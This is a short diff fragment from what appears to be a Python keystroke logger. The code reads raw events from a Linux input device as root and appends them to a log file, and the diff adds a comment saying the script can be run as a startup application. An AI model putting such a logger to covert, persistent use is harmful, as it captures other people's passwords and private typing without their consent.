@@ -80,6 +80,7 @@ port = open ("/dev/input/event4", "rb")
 # The event can be found out by the command : cat /proc/bus/input/devices
 # You might have to run the program as root.
 # You may call the convert_to_original method if you wish to see the keys in their original form and not the coded form.
+# This script can be added as a startup application.
 ctr = 0
 f = open ("logfile.txt", "a")
 try :
